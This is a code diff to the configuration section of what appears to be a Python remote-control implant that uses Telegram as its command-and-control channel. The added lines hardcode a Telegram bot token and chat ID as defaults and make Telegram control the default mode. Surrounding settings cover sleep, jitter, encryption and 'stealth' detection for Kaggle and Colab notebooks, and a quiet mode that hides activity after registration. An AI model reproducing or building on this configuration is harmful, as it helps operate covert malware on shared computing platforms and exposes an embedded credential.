@@ -28,8 +28,8 @@ except ImportError:
 # ─── Configuration ─────────────────────────────────────────────────────────────
 # Telegram C2 works directly - no public URL needed
 C2_URL   = os.environ.get("C2_URL", "")  # Empty = Telegram C2 mode (default)
-TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
-TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
+TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8141566162:AAGRxoqlDhU5I0sM0ldA3T8t4KH-wpObQl4")
+TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "8667199004")
 SLEEP    = int(os.environ.get("SLEEP",  "3"))
 JITTER   = int(os.environ.get("JITTER", "5"))
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
@@ -37,8 +37,8 @@ AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
 QUIET_MODE = True  # After registration, only log to file (not stdout)
 
-# Detect C2 mode
-TELEGRAM_MODE = (C2_URL == "" or C2_URL is None) and bool(TELEGRAM_BOT_TOKEN)
+# Detect C2 mode - Telegram mode when no HTTP URL provided
+TELEGRAM_MODE = (C2_URL == "" or C2_URL is None)
 
 # Kaggle/Colab stealth settings
 KAGGLE_QUIET = os.environ.get("KAGGLE_KERNEL_RUN_TYPE", "") != ""  # Auto-detect Kaggle
